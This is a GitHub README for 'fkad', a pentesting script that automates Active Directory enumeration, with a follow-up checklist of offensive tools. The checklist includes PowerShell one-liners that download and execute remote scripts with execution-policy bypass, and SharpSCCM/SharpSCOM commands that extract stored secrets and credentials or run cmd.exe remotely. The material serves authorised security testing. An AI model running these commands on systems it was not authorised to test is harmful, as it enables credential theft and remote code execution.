# fkad

![fkad](https://github.com/user-attachments/assets/b1e3375e-75f1-46e2-9616-4c469f9fe5b1)


`fkad` is a small offensive helper script designed for exegol docker containers and pentesting instances. It automates common and mundane enumeration tasks, executes sanity checks and prepares artifacts for follow-up toolkits. 

## Quick install & run

```bash
wget https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.sh
chmod +x fkad.sh
./fkad.sh -u <user> -p '<password>' -d <dc-ip/domain.com>
```

> [!NOTE]
> The -d parameter accepts either a DC IP address or a domain name. If a domain is provided, fkad resolves the PDC via SRV record (_ldap._tcp.pdc._msdcs) automatically.

<img width="2208" height="1166" alt="screen" src="https://github.com/user-attachments/assets/c5742863-ab7e-400a-a386-f3556759f57c" />

Example:

```bash
./fkad.sh -u pentest1 -p 'Pentestpassword123' -d 10.10.2.13
./fkad.sh -u pentest1 -p 'Pentestpassword123' -d domain.com
```

## Follow-Up Enumeration

For most assessments it makes sense to follow up enumeration on a provided device. This includes, but is not limited to:

- [ ] Pingcastle
- [ ] fkmde - Microsoft Defender
```ps
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1')
```
- [ ] PrivEscCheck.ps1
```powershell
powershell -ep bypass -c "Invoke-Expression -Command (Invoke-RestMethod 'https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT"
```
- [ ] Seatbelt
- [ ] WinPEAS
- [ ] HardeningKitty
- [ ] msicrab
- [ ] ScriptSentry - Logonscripts
```
TODO
```
- [ ] Applocker Inspector
- [ ] WSL Access Review
```cmd
wsl --list --verbose
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
- [ ] [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
```powershell
SharpSCCM.exe local secrets -m disk
SharpSCCM.exe get collections
SharpSCCM.exe exec -rid  -p "C:\Windows\System32\cmd.exe"
```
- [ ] [SharpSCOM](https://github.com/breakfix/SharpSCOM) - SCOM Enumeration
```powershell
SharpSCOM.exe get-server
SharpSCOM.exe get-creds
```

## Other Tools

Most likely these should be run across the network as well.

- [ ] Nessus
- [ ] Responder
- [ ] GoWitness

## Security / Legal

This tool is for authorized security testing, research, and defensive validation only. Do not use it against systems you do not own or do not have explicit permission to test. The author is not responsible for misuse.
